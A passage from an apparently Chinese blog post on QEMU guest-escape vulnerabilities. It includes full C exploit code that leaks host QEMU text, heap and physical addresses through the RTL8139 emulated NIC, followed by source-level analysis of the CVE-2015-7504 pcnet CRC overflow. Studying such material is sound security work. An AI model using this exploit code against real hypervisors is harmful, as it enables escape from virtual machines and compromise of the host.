class="number">0x04</span>,</span><br><span class="line">	AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">	AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">	Wrap            = <span class="number">0x80</span>,</span><br><span class="line">	MxDMA256        = <span class="number">0x400</span>,</span><br><span class="line">	RbLen64         = <span class="number">0x1800</span>,</span><br><span class="line">	RxFTh512        = <span class="number">0xa000</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> ChipCmdBits &#123;</span><br><span class="line">    CmdReset = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* C+ mode */</span></span><br><span class="line"><span class="keyword">enum</span> CplusCmdBits &#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cplus_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> dw0;</span><br><span class="line">	<span class="keyword">uint32_t</span> dw1;</span><br><span class="line">	<span class="keyword">uint32_t</span> bufLO;</span><br><span class="line">	<span class="keyword">uint32_t</span> bufHI;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ring</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cplus_desc</span> * <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span> * buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> rtl8139_packet [] = &#123;</span><br><span class="line">	<span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>,</span><br><span class="line">	<span class="number">0x56</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x40</span>, <span class="number">0x06</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0xc0</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0xc0</span>, <span class="number">0xa8</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0x02</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0xbe</span>, <span class="number">0xef</span>, <span class="number">0xca</span>, <span class="number">0xfe</span>, <span class="number">0xba</span>, <span class="number">0xbe</span>, <span class="number">0xca</span>, <span class="number">0xfe</span>,</span><br><span class="line">	<span class="number">0xba</span>, <span class="number">0xbe</span>, <span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0xde</span>, <span class="number">0xad</span>, <span class="number">0x66</span>, <span class="number">0x6c</span> ,<span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x67</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> v2p(<span class="keyword">void</span> * addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> index = (<span class="keyword">uint64_t</span>)addr / PAGE_SIZE;</span><br><span class="line">    lseek(fd,index * <span class="number">8</span>,SEEK_SET);</span><br><span class="line">    <span class="keyword">uint64_t</span> num = <span class="number">0</span>;</span><br><span class="line">    read(fd,&amp;num,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((num &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>)) &lt;&lt; <span class="number">12</span>) + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cfgtx</span><span class="params">(struct cplus_desc * addr,<span class="keyword">char</span> * buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    addr-&gt;dw0 |= CP_TX_OWN|CP_TX_EOR|CP_TX_LS|CP_TX_IPCS|CP_TX_LGSEN;</span><br><span class="line">    addr-&gt;dw0 += ETH_MTU + ETH_HLEN;</span><br><span class="line">    addr-&gt;bufLO = v2p(buf);</span><br><span class="line">    <span class="keyword">uint32_t</span> paddr = v2p(addr);</span><br><span class="line">    outl(paddr,RTL8139 + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>,RTL8139 + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cfgrx</span><span class="params">(<span class="keyword">void</span> ** rx_ptr,struct cplus_desc * buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> addr;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; MAX; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">void</span> * p = <span class="built_in">malloc</span>(<span class="number">1514</span>);</span><br><span class="line">        rx_ptr[i] = p;</span><br><span class="line">        addr = (<span class="keyword">uint32_t</span>)v2p(p);</span><br><span class="line"></span><br><span class="line">		buf[i].dw0 |= CP_RX_OWN;</span><br><span class="line">		<span class="keyword">if</span> (i == MAX - <span class="number">1</span>)</span><br><span class="line">			buf[i].dw0 |= CP_RX_EOR;</span><br><span class="line">		buf[i].dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">		buf[i].dw0 |= USHRT_MAX;</span><br><span class="line">		buf[i].bufLO = addr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> paddr = v2p(buf);</span><br><span class="line">    outl(paddr,RTL8139 + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>,RTL8139 + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send</span><span class="params">(<span class="keyword">void</span> * buf,<span class="keyword">void</span> * data,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, data, len);</span><br><span class="line">    outb((<span class="number">1</span> &lt;&lt; <span class="number">6</span>), RTL8139+ TxPoll);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// void xxd(void *ptr, size_t size)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">// 	size_t i;</span></span><br><span class="line"><span class="comment">// 	for (i = 0; i &lt; size; i++) &#123;</span></span><br><span class="line"><span class="comment">// 		if (i % 16 == 0) printf("\n0x%016x: ", ptr+i);</span></span><br><span class="line"><span class="comment">// 		printf("%02x", *(uint8_t *)(ptr+i));</span></span><br><span class="line"><span class="comment">// 		if (i % 16 != 0 &amp;&amp; i % 2 == 1) printf(" ");</span></span><br><span class="line"><span class="comment">// 	&#125;</span></span><br><span class="line"><span class="comment">// 	printf("\n");</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">uint64_t</span> findText(<span class="keyword">void</span> * ptr,<span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> text_offset[<span class="number">6</span>] = &#123;<span class="number">0xf0650</span>,<span class="number">0x36d0dd</span>,<span class="number">0x36d1fc</span>,<span class="number">0xf01a0</span>,<span class="number">0x8ee100</span>,<span class="number">0x161a850</span>&#125;;</span><br><span class="line">    <span class="keyword">uint64_t</span> TEXT = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; size; i+=<span class="number">8</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span> *)(ptr + i);</span><br><span class="line">		<span class="keyword">if</span>((value!= <span class="number">0</span>) &amp;&amp; ((value &amp; <span class="number">0xff00000000000000</span>) == <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((value &gt;&gt; <span class="number">44</span>) == <span class="number">5</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">6</span>;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(((value - text_offset[j]) &amp; <span class="number">0xfff</span>) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        flag = <span class="number">1</span>;</span><br><span class="line">                        TEXT = value - text_offset[j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"TEXT: 0x%llx\n"</span>,TEXT);</span><br><span class="line">            <span class="keyword">return</span> TEXT;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> findHeap(<span class="keyword">void</span> * ptr,<span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_offset[<span class="number">9</span>] = &#123;<span class="number">0x574b0</span>,<span class="number">0x1130a0</span>,<span class="number">0xecd3d0</span>,<span class="number">0xc2ac0</span>,<span class="number">0x46850</span>,<span class="number">0xc6ac8</span>,<span class="number">0x13a508</span>,<span class="number">0x13a600</span>,<span class="number">0xd50258</span>&#125;;</span><br><span class="line">    <span class="keyword">uint64_t</span> HEAP = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; size; i+=<span class="number">8</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span> *)(ptr + i);</span><br><span class="line">		<span class="keyword">if</span>((value!= <span class="number">0</span>) &amp;&amp; ((value &amp; <span class="number">0xff00000000000000</span>) == <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((value &gt;&gt; <span class="number">44</span>) == <span class="number">5</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">9</span>;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(((value - heap_offset[j]) &amp; <span class="number">0xfff</span>) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        flag = <span class="number">1</span>;</span><br><span class="line">                        HEAP = value - heap_offset[j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"HEAP: 0x%llx\n"</span>,HEAP);</span><br><span class="line">            <span class="keyword">return</span> HEAP;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> findPhy(<span class="keyword">void</span> * ptr,<span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> PHY = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; size; i+=<span class="number">8</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span> *)(ptr + i);</span><br><span class="line">		<span class="keyword">if</span>((value!= <span class="number">0</span>) &amp;&amp; ((value &amp; <span class="number">0xff00000000000000</span>) == <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>((value &amp; <span class="number">0xff0000000000</span>) == <span class="number">0x7f0000000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                value &amp;= <span class="number">0xffffffffff000000</span>;</span><br><span class="line">                value -= <span class="number">0x80000000</span>;</span><br><span class="line">                PHY = value;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"PHY: 0x%llx\n"</span>,PHY);</span><br><span class="line">            <span class="keyword">return</span> PHY;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> PHY = <span class="number">0</span>,HEAP = <span class="number">0</span>,TEXT = <span class="number">0</span>;</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>,O_RDONLY);</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    outb(CmdTxEnb|CmdRxEnb,RTL8139 + ChipCmd);</span><br><span class="line">    outw(CPlusTxEnb|CPlusRxEnb,RTL8139 + CpCmd);</span><br><span class="line">    outl(TxLoopBack, RTL8139 + TxConfig);</span><br><span class="line">	outl(AcceptMyPhys, RTL8139 + RxConfig);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cplus_desc</span> * <span class="title">tx_addr</span> = <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">cplus_desc</span>));</span></span><br><span class="line">    <span class="built_in">memset</span>(tx_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(struct cplus_desc));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * tx_buf = <span class="built_in">malloc</span>(ETH_HLEN + ETH_MTU);</span><br><span class="line">    <span class="built_in">memset</span>(tx_buf,<span class="number">0</span>,ETH_HLEN + ETH_MTU);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> ** rx_ptr = <span class="built_in">malloc</span>(<span class="number">8</span> * MAX);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * rx_buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct cplus_desc) * MAX);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(rx_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(struct cplus_desc) * MAX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cfgtx(tx_addr,tx_buf);</span><br><span class="line">    cfgrx(rx_ptr,rx_buf);</span><br><span class="line">    </span><br><span class="line">    send(tx_buf, rtl8139_packet,<span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		PHY = findPhy(rx_ptr[i], <span class="number">1514</span>);</span><br><span class="line">        <span class="keyword">if</span>(PHY) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		TEXT = findText(rx_ptr[i], <span class="number">1514</span>);</span><br><span class="line">        <span class="keyword">if</span>(TEXT) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		HEAP = findHeap(rx_ptr[i], <span class="number">1514</span>);</span><br><span class="line">        <span class="keyword">if</span>(HEAP) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://47.106.144.114/wp-content/uploads/2020/02/1579087190929.png" alt></p>
<p><img src="http://47.106.144.114/wp-content/uploads/2020/02/1579087273073.png" alt></p>
<h2 id="CVE-2015-7504"><a href="#CVE-2015-7504" class="headerlink" title="CVE-2015-7504"></a>CVE-2015-7504</h2><p>cve-2015-7504漏洞存在于hw/net/pcnet.c的pcnet_receive()函数中,漏洞出现在对于数据包的crc校验计算中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!s-&gt;looptest) &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(src, buf, size);</span><br><span class="line">                <span class="comment">/* no need to compute the CRC */</span></span><br><span class="line">                src[size] = <span class="number">0</span>;</span><br><span class="line">                src[size + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                src[size + <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">                src[size + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                size += <span class="number">4</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s-&gt;looptest == PCNET_LOOPTEST_CRC ||</span><br><span class="line">                       !CSR_DXMTFCS(s) || size &lt; MIN_BUF_SIZE+<span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">uint32_t</span> fcs = ~<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">uint8_t</span> *p = src;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (p != &amp;src[size])</span><br><span class="line">                    CRC(fcs, *p++);</span><br><span class="line">                *(<span class="keyword">uint32_t</span> *)p = htonl(fcs);</span><br><span class="line">                size += <span class="number">4</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">uint32_t</span> fcs = ~<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">uint8_t</span> *p = src;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (p != &amp;src[size<span class="number">-4</span>])</span><br><span class="line">                    CRC(fcs, *p++);</span><br><span class="line">                crc_err = (*(<span class="keyword">uint32_t</span> *)p != htonl(fcs));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>在crc的计算时,没有对size进行检测,就把crc后的结果加到了buffer后面,而buffer处在:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">struct PCNetState_st &#123;</span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line">    QEMUTimer *poll_timer;</span><br><span class="line">    int rap, isr, lnkst;</span><br><span class="line">    uint32_t rdra, tdra;</span><br><span class="line">    uint8_t prom[16];</span><br><span class="line">    uint16_t csr[128];</span><br><span class="line">    uint16_t bcr[32];</span><br><span class="line">    int xmit_pos;</span><br><span class="line">    uint64_t timer;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    uint8_t buffer[4096];</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    void (*phys_mem_read)(void *dma_opaque, hwaddr addr,</span><br><span class="line">                         uint8_t *buf, int len, int do_bswap);</span><br><span class="line">    void (*phys_mem_write)(void *dma_opaque, hwaddr addr,</span><br><span class="line">                          uint8_t *buf, int len, int do_bswap);</span><br><span class="line">    void *dma_opaque;</span><br><span class="line">    int tx_busy;</span><br><span class="line">    int looptest;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到buffer的大小为4096,在pcnet_receive的上层函数中,限制了size的大小小于等于4096</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if (s-&gt;xmit_pos + bcnt &gt; sizeof(s-&gt;buffer)) &#123;</span><br><span class="line">            s-&gt;xmit_pos = -1;</span><br><span class="line">            goto txdone;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s-&gt;phys_mem_read(s-&gt;dma_opaque, PHYSADDR(s, tmd.tbadr),</span><br><span class="line">                         s-&gt;buffer + s-&gt;xmit_pos, bcnt, CSR_BSWP(s));</span><br><span class="line">        s-&gt;xmit_pos += bcnt;</span><br><span class="line">        </span><br><span class="line">        if (!GET_FIELD(tmd.status, TMDS, ENP)) &#123;</span><br><span class="line">            goto txdone;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">#ifdef PCNET_DEBUG</span><br><span class="line">        printf(&quot;pcnet_transmit size=%d\n&quot;, s-&gt;xmit_pos);</span><br><span class="line">#endif</span><br><span class="line">        if (CSR_LOOP(s)) &#123;</span><br><span class="line">            if (BCR_SWSTYLE(s) == 1)</span><br><span class="line">                add_crc = !GET_FIELD(tmd.status, TMDS, NOFCS);</span><br><span class="line">            s-&gt;looptest = add_crc ? PCNET_LOOPTEST_CRC : PCNET_LOOPTEST_NOCRC;</span><br><span class="line">            pcnet_receive(qemu_get_queue(s-&gt;nic), s-&gt;buffer, s-&gt;xmit_pos);</span><br></pre></td></tr></table></figure>
<p>可以看到s-&gt;xmit_pos + bcnt &gt; 4096, s-&gt;xmit_pos += bcnt;这里可以看到size为4096,当size为4096的时候,我们恰好可以溢出四个字节,可以看到结构体的相邻buffer的是一根指针<code>qemu_irq irq</code>,我们可以看到这个指针的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct IRQState *qemu_irq;</span><br><span class="line"></span><br><span class="line">struct IRQState &#123;</span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    qemu_irq_handler handler;</span><br><span class="line">    void *opaque;</span><br><span class="line">    int n;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void qemu_set_irq(qemu_irq irq, int level)</span><br><span class="line">&#123;</span><br><span class="line">    if (!irq)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
